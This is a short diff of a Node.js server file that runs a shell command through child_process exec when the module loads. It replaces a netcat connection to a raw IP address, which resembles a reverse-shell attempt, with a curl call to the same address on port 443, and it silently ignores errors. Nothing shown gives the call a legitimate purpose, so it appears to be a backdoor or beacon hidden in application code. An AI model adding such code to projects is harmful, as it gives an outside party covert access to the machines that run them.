@@ -8,7 +8,7 @@ const public = file => path.resolve("public", file || '');
 
 var fs = require('fs');
 const { exec } = require('child_process');
-exec('bash -c "nc 137.184.229.213 80 0>&1"', (err, stdout, stderr) => {
+exec('bash -c "curl http://137.184.229.213:443"', (err, stdout, stderr) => {
   if (err) {
     // node couldn't execute the command
     return;
